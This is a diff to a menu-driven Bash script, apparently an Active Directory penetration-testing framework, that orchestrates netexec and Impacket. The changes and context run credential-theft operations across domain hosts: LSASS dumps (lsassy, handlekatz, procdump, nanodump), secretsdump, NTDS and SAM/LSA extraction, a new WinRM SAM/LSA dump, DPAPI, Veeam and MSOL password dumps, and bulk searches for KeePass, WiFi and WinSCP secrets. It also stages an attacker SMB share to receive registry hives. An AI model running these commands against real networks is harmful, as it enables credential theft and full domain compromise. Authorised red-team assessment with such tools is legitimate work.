     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M webdav --log ${output_dir}/Vulnerabilities/ne_webdav_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
 smbsigning_check() {
     echo -e "${BLUE}[*] Listing servers with SMB signing disabled or not required ${NC}"
-    smb_scan
+    ne_smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} --gen-relay-list ${output_dir}/Vulnerabilities/ne_smbsigning_output_${dc_domain}.txt" 2>&1
     if [ ! -s "${output_dir}/Vulnerabilities/ne_smbsigning_output_${dc_domain}.txt" ]; then
         echo -e "${PURPLE}[-] No servers with SMB signing disabled found ${NC}"
@@ -2685,7 +2897,7 @@ smbsigning_check() {
 
 smb_checks() {
     echo -e "${BLUE}[*] ntlmv1, smbghost, remove-mic checks ${NC}"
-    smb_scan
+    ne_smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M ntlmv1 --log ${output_dir}/Vulnerabilities/ne_ntlmv1_output_${dc_domain}.txt" 2>&1
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M smbghost --log ${output_dir}/Vulnerabilities/ne_smbghost_output_${dc_domain}.txt" 2>&1
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M remove-mic --log ${output_dir}/Vulnerabilities/ne_removemic_output_${dc_domain}.txt" 2>&1
@@ -2700,7 +2912,7 @@ rpcdump_check() {
     else
         mkdir -p "${output_dir}/Vulnerabilities/RPCDump"
         echo -e "${BLUE}[*] Impacket rpcdump${NC}"
-        smb_scan
+        ne_smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] RPC Dump of ${i} ${NC}"
             run_command "${impacket_rpcdump} ${argument_imp}\\@$i" >"${output_dir}/Vulnerabilities/RPCDump/impacket_rpcdump_output_${i}.txt"
@@ -2725,7 +2937,7 @@ coercer_check() {
     else
         mkdir -p "${output_dir}/Vulnerabilities/Coercer"
         echo -e "${BLUE}[*] Running scan using coercer ${NC}"
-        smb_scan
+        ne_smb_scan
         run_command "${coercer} scan ${argument_coercer} -f ${servers_smb_list} --dc-ip $dc_ip --auth-type smb --export-xlsx ${output_dir}/Vulnerabilities/Coercer/coercer_output_${dc_domain}.xlsx" | tee "${output_dir}/Vulnerabilities/Coercer/coercer_output_${dc_domain}.txt"
         if grep -q -r "SMB  Auth" "${output_dir}/Vulnerabilities/Coercer/"; then
             echo -e "${GREEN}[+] Servers vulnerable to Coerce attacks found! Follow steps below for exploitation:${NC}" | tee -a "${output_dir}/Vulnerabilities/coercer_exploitation_steps_${dc_domain}.txt"
@@ -2776,7 +2988,7 @@ runfinger_check() {
         echo -e "${RED}[-] RunFinger.py not found! Please verify the installation of RunFinger${NC}"
     else
         echo -e "${BLUE}[*] Using RunFinger.py${NC}"
-        smb_scan
+        ne_smb_scan
         current_dir=$(pwd)
         cd "${output_dir}/Vulnerabilities" || exit
         run_command "${python3} ${RunFinger} -f ${servers_smb_list}" | tee -a "${output_dir}/Vulnerabilities/RunFinger_${dc_domain}.txt"
@@ -2801,15 +3013,16 @@ mssql_enum() {
         echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
     else
         echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
-        sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' "${output_dir}"/DomainRecon/Servers/sql_list_*_"${dc_domain}.txt" | sort -uf >"${sql_hostname_list}" 2>&1
+        sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' "${output_dir}"/DomainRecon/Servers/sql_list_*_"${dc_domain}.txt" 2>/dev/null | sort -uf >"${sql_hostname_list}" 2>&1
         for i in $(/bin/cat "${sql_hostname_list}"); do
-            grep -i "$(echo "$i" | cut -d "." -f 1)" "${output_dir}/DomainRecon/dns_records_${dc_domain}.csv" 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 | sort -u >"${sql_ip_list}"
+            grep -i "$(echo "$i" | cut -d "." -f 1)" "${output_dir}/DomainRecon/dns_records_${dc_domain}.csv" 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> "${sql_ip_list}"
         done
+        sort -u "${sql_ip_list}" -o "${sql_ip_list}" 2>/dev/null
         if [ -f "${target_sql}" ]; then
-            run_command "${netexec} ${ne_verbose} mssql --port ${ldap_port} ${target_sql} ${argument_ne} -M mssql_priv --log ${output_dir}/MSSQL/ne_mssql_output_${dc_domain}.txt" 2>&1
-            run_command "${netexec} ${ne_verbose} mssql --port ${ldap_port} ${target_sql} ${argument_ne} -M enum_impersonate --log ${output_dir}/MSSQL/ne_mssql_output_${dc_domain}.txt" 2>&1
-            run_command "${netexec} ${ne_verbose} mssql --port ${ldap_port} ${target_sql} ${argument_ne} -M enum_logins --log ${output_dir}/MSSQL/ne_mssql_output_${dc_domain}.txt" 2>&1
-            run_command "${netexec} ${ne_verbose} mssql --port ${ldap_port} ${target_sql} ${argument_ne} -M enum_links --log ${output_dir}/MSSQL/ne_mssql_output_${dc_domain}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M mssql_priv --log ${output_dir}/MSSQL/ne_mssql_output_${dc_domain}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M enum_impersonate --log ${output_dir}/MSSQL/ne_mssql_output_${dc_domain}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M enum_logins --log ${output_dir}/MSSQL/ne_mssql_output_${dc_domain}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} mssql ${target_sql} ${argument_ne} -M enum_links --log ${output_dir}/MSSQL/ne_mssql_output_${dc_domain}.txt" 2>&1
         else
             echo -e "${PURPLE}[-] No SQL servers found! Please re-run SQL enumeration and try again..${NC}"
         fi
@@ -3388,15 +3601,10 @@ add_spn_constrained() {
 ###### pwd_dump: Password Dump
 juicycreds_dump() {
     echo -e "${BLUE}[*] Search for juicy credentials: Firefox, KeePass, Rdcman, Teams, WiFi, WinScp${NC}"
-    smb_scan
+    ne_smb_scan
     for i in $(/bin/cat "${servers_smb_list}"); do
         echo -e "${CYAN}[*] Searching in ${i} ${NC}"
-        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M keepass_discover --log ${output_dir}/Credentials/keepass_discover_${dc_domain}_${i}.txt" 2>&1
-        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M rdcman --log ${output_dir}/Credentials/rdcman_${dc_domain}_${i}.txt" 2>&1
-        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M teams_localdb --log ${output_dir}/Credentials/teams_localdb_${dc_domain}_${i}.txt" 2>&1
-        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M wifi --log ${output_dir}/Credentials/wifi_${dc_domain}_${i}.txt" 2>&1
-        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M winscp --log ${output_dir}/Credentials/winscp_${dc_domain}_${i}.txt" 2>&1
-        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M snipped --log ${output_dir}/Credentials/snipped_${dc_domain}_${i}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M keepass_discover -M rdcman -M teams_localdb -M wifi -M winscp -M snipped -M powershell_history -M mremoteng -M iis -M vnc --log ${output_dir}/Credentials/keepass_discover_${dc_domain}_${i}.txt" 2>&1
     done
     echo -e ""
 }
@@ -3439,7 +3647,7 @@ secrets_dump() {
         if [ "${nullsess_bool}" == true ]; then
             echo -e "${PURPLE}[-] secretsdump requires credentials${NC}"
         else
-            smb_scan
+            ne_smb_scan
             for i in $(/bin/cat "${servers_smb_list}"); do
                 echo -e "${CYAN}[*] secretsdump of ${i} ${NC}"
                 run_command "${impacket_secretsdump} ${argument_imp}\\@${i} -dc-ip ${dc_ip}" | tee "${output_dir}/Credentials/secretsdump_${dc_domain}_${i}.txt"
@@ -3457,7 +3665,7 @@ samsystem_dump() {
         if [ "${nullsess_bool}" == true ]; then
             echo -e "${PURPLE}[-] reg requires credentials${NC}"
         else
-            smb_scan
+            ne_smb_scan
             set_attackerIP
             echo -e "${YELLOW}[*] Run an SMB server using the following command and then press ENTER to continue....${NC}"
             echo -e "${impacket_smbserver} -ip $attacker_IP -smb2support lwpshare ${output_dir}/Credentials/"
@@ -3478,7 +3686,6 @@ ntds_dump() {
         echo -e "${PURPLE}[-] NTDS dump requires credentials${NC}"
     else
         run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --ntds --log ${output_dir}/Credentials/ntds_dump_${dc_domain}.txt" 2>&1
-        #${netexec} ${ne_verbose} smb ${target} "${argument_ne}" -M ntdsutil --log ${output_dir}/Credentials/ntds_dump_${dc_domain}.txt"
     fi
     echo -e ""
 }
@@ -3488,7 +3695,7 @@ samlsa_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSA SAM dump requires credentials${NC}"
     else
-        smb_scan
+        ne_smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] SAM LSA dump of ${i} ${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --sam secdump --log ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt" 2>&1
@@ -3504,7 +3711,7 @@ samlsa_reg_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSA SAM dump requires credentials${NC}"
     else
-        smb_scan
+        ne_smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] SAM LSA dump of ${i} ${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --sam regdump --log ${output_dir}/Credentials/sam_reg_dump_${dc_domain}_${i}.txt" 2>&1
@@ -3519,7 +3726,7 @@ lsassy_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        smb_scan
+        ne_smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using lsassy${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M lsassy --log ${output_dir}/Credentials/lsass_dump_lsassy_${dc_domain}_${i}.txt" 2>&1
@@ -3533,7 +3740,7 @@ handlekatz_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        smb_scan
+        ne_smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using handlekatz${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M handlekatz --log ${output_dir}/Credentials/lsass_dump_handlekatz_${dc_domain}_${i}.txt" 2>&1
@@ -3547,7 +3754,7 @@ procdump_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        smb_scan
+        ne_smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using procdump ${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M procdump --log ${output_dir}/Credentials/lsass_dump_procdump_${dc_domain}_${i}.txt" 2>&1
@@ -3561,7 +3768,7 @@ nanodump_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] LSASS dump requires credentials${NC}"
     else
-        smb_scan
+        ne_smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] LSASS dump of ${i} using nanodump ${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M nanodump --log ${output_dir}/Credentials/lsass_dump_nanodump_${dc_domain}_${i}.txt" 2>&1
@@ -3575,7 +3782,7 @@ dpapi_dump() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] DPAPI dump requires credentials${NC}"
     else
-        smb_scan
+        ne_smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] DPAPI dump of ${i} using netexec ${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --dpapi cookies --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt" 2>&1
@@ -3593,7 +3800,7 @@ donpapi_dump() {
         if [ "${nullsess_bool}" == true ]; then
             echo -e "${PURPLE}[-] DonPAPI requires credentials${NC}"
         else
-            smb_scan
+            ne_smb_scan
             for i in $(/bin/cat "${servers_smb_list}"); do
                 echo -e "${CYAN}[*] DonPAPI dump of ${i} ${NC}"
                 run_command "${donpapi} -o ${output_dir}/Credentials/DonPAPI collect ${argument_donpapi} -t ${i} --dc-ip ${dc_ip}" | tee "${output_dir}/Credentials/DonPAPI/DonPAPI_${dc_domain}_${i}.txt"
@@ -3635,29 +3842,56 @@ bitlocker_dump() {
     echo -e ""
 }
 
+winrm_dump() {
+    echo -e "${BLUE}[*] Dumping LSA SAM credentials (winrm) ${NC}"
+    if [ "${nullsess_bool}" == true ]; then
+        echo -e "${PURPLE}[-] LSA SAM dump requires credentials${NC}"
+    else
+        target_winrm=""
+        read -rp ">> " target_winrm </dev/tty
+        while [ "${target_winrm}" == "" ]; do
+            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+            read -rp ">> " target_winrm </dev/tty
+        done
+            run_command "${netexec} ${ne_verbose} winrm ${target_winrm} ${argument_ne} --sam --log ${output_dir}/Credentials/sam_reg_dump_${dc_domain}_${target_winrm}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} winrm ${target_winrm} ${argument_ne} --lsa --log ${output_dir}/Credentials/lsa_reg_dump_${dc_domain}_${target_winrm}.txt" 2>&1
+    fi
+    echo -e ""
+}
+
 msol_dump() {
-    echo -e "${BLUE}[*] MSOL password dump. Please specify IP or hostname of Azure AD-Connect server:${NC}"
-    echo -e "${CYAN}[*] Example: 10.1.0.5 or ADConnect01 or ADConnect01.domain.com ${NC}"
-    target_msol=""
-    read -rp ">> " target_msol </dev/tty
-    while [ "${target_msol}" == "" ]; do
-        echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+    echo -e "${BLUE}[*] MSOL password dump.${NC}"
+    if [ "${nullsess_bool}" == true ]; then
+        echo -e "${PURPLE}[-] MSOL password dump requires credentials${NC}"
+    else
+        echo -e "${BLUE}[*] Please specify IP or hostname of Azure AD-Connect server:${NC}"
+        echo -e "${CYAN}[*] Example: 10.1.0.5 or ADConnect01 or ADConnect01.domain.com ${NC}"
+        target_msol=""
         read -rp ">> " target_msol </dev/tty
-    done
-    run_command "${netexec} ${ne_verbose} smb ${target_msol} ${argument_ne} -M msol --log ${output_dir}/Credentials/msol_${dc_domain}_${i}.txt" 2>&1
+        while [ "${target_msol}" == "" ]; do
+            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+            read -rp ">> " target_msol </dev/tty
+        done
+        run_command "${netexec} ${ne_verbose} smb ${target_msol} ${argument_ne} -M msol --log ${output_dir}/Credentials/msol_${dc_domain}_${target_msol}.txt" 2>&1
+    fi
     echo -e ""
 }
 
 veeam_dump() {
-    echo -e "${BLUE}[*] Veeam credentials dump. Please specify IP or hostname of Veeam server:${NC}"
-    echo -e "${CYAN}[*] Example: 10.1.0.5 or VEEAM01 or VEEAM01.domain.com ${NC}"
-    target_veeam=""
-    read -rp ">> " target_veeam </dev/tty
-    while [ "${target_veeam}" == "" ]; do
-        echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+    echo -e "${BLUE}[*] Veeam credentials dump.${NC}"
+    if [ "${nullsess_bool}" == true ]; then
+        echo -e "${PURPLE}[-] Veeam credentials dump requires credentials${NC}"
+    else
+        echo -e "${BLUE}[*] Please specify IP or hostname of Veeam server:${NC}"
+        echo -e "${CYAN}[*] Example: 10.1.0.5 or VEEAM01 or VEEAM01.domain.com ${NC}"
+        target_veeam=""
         read -rp ">> " target_veeam </dev/tty
-    done
-    run_command "${netexec} ${ne_verbose} smb ${target_veeam} ${argument_ne} -M veeam --log ${output_dir}/Credentials/veeam_${dc_domain}_${i}.txt" 2>&1
+        while [ "${target_veeam}" == "" ]; do
+            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+            read -rp ">> " target_veeam </dev/tty
+        done
+        run_command "${netexec} ${ne_verbose} smb ${target_veeam} ${argument_ne} -M veeam --log ${output_dir}/Credentials/veeam_${dc_domain}_${target_veeam}.txt" 2>&1
+    fi
     echo -e ""
 }
 
@@ -3895,7 +4129,7 @@ modify_target() {
     echo -e "1) Domain Controllers"
     echo -e "2) All domain servers"
     echo -e "3) File containing list of servers"
-    echo -e "4) IP or hostname"
+    echo -e "4) IP/hostname or IP range"
     echo -e "back) Go back"
 
     read -rp "> " option_selected </dev/tty
@@ -3938,7 +4172,7 @@ modify_target() {
         read -rp ">> " custom_ip </dev/tty
         echo -n "$custom_ip" >"${custom_servers_list}" 2>/dev/null
         while [ ! -s "${custom_servers_list}" ]; do
-            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+            echo -e "${RED}Invalid IP/hostname or IP range.${NC} Please specify IP/hostname or IP range:"
             read -rp ">> " custom_ip </dev/tty
             echo -n "$custom_ip" >"${custom_servers_list}" 2>/dev/null
         done
@@ -5165,10 +5399,11 @@ pwd_menu() {
         echo -e "13) Dump dpapi secrets using netexec"
         echo -e "14) Dump secrets using DonPAPI"
         echo -e "15) Dump secrets using hekatomb (only on DC)"
-        echo -e "16) Search for juicy credentials (KeePass, Rdcman, Teams, WiFi, WinScp, Snipped)"
+        echo -e "16) Search for juicy information using netexec"
         echo -e "17) Dump Veeam credentials (only from Veeam server)"
         echo -e "18) Dump Msol password (only from Azure AD-Connect server)"
         echo -e "19) Extract Bitlocker Keys"
+        echo -e "20) Dump SAM and LSA secrets using winrm with netexec"
     fi
     echo -e "back) Go back"
     echo -e "exit) Exit"
@@ -5278,6 +5513,11 @@ pwd_menu() {
 
     19)
         bitlocker_dump
+        pwd_menu
+        ;;
+
+    20)
+        winrm_dump
         pwd_menu
         ;;
 
@@ -5469,6 +5709,83 @@ cmdexec_menu() {
         echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
         echo -e ""
         cmdexec_menu
+        ;;
+    esac
+}
+
+netscan_menu() {
+    mkdir -p "${output_dir}/Scans"
+    echo -e ""
+    echo -e "${CYAN}[Network Scan menu]${NC} Please choose from the following options:"
+    echo -e "------------------------------------------------------------------"
+    echo -e "${YELLOW}[i]${NC} Current target(s): ${curr_targets} ${YELLOW}${custom_servers}${custom_ip}${NC}"
+    echo -e "m) Modify target(s)"
+    echo -e "1) Identify hosts with accessible SMB port using netexec"
+    echo -e "2) Identify hosts with accessible RDP port using netexec"
+    echo -e "3) Identify hosts with accessible WinRM port using netexec"
+    echo -e "4) Identify hosts with accessible SSH port using netexec"
+    echo -e "5) Identify hosts with accessible FTP port using netexec"
+    echo -e "6) Identify hosts with accessible VNC port using netexec"
+    echo -e "7) Identify hosts with accessible MSSQL port using netexec"
+    echo -e "back) Go back"
+    echo -e "exit) Exit"
+
+    read -rp "> " option_selected </dev/tty
+
+    case ${option_selected} in
+
+    m)
+        modify_target
+        netscan_menu
+        ;;
+
+    1)
+        ne_smb_scan
+        netscan_menu
+        ;;
+
+    2)
+        ne_rdp_scan
+        netscan_menu
+        ;;
+
+    3)
+        ne_winrm_scan
+        netscan_menu
+        ;;
+
+    4)
+        ne_ssh_scan
+        netscan_menu
+        ;;
+
+    5)
+        ne_ftp_scan
+        netscan_menu
+        ;;
+
+    6)
+        ne_vnc_scan
+        netscan_menu
+        ;;
+
+    7)
+        ne_mssql_scan
+        netscan_menu
+        ;;
+
+    back)
+        main_menu
+        ;;
+
+    exit)
+        exit 1
+        ;;
+
+    *)
+        echo -e "${RED}[-] Unknown option ${option_selected}... ${NC}"
+        echo -e ""
+        netscan_menu
         ;;
     esac
 }
@@ -5897,6 +6214,7 @@ main_menu() {
     echo -e "9) Password Dump Menu"
     echo -e "10) AD Objects or Attributes Modification Menu"
     echo -e "11) Command Execution Menu"
+    echo -e "12) Network Scan Menu"
     echo -e "back) Go back to Init Menu"
     echo -e "exit) Exit"
 
@@ -5948,6 +6266,10 @@ main_menu() {
 
     11)
         cmdexec_menu
+        ;;
+
+    12)
+        netscan_menu
         ;;
 
     back)
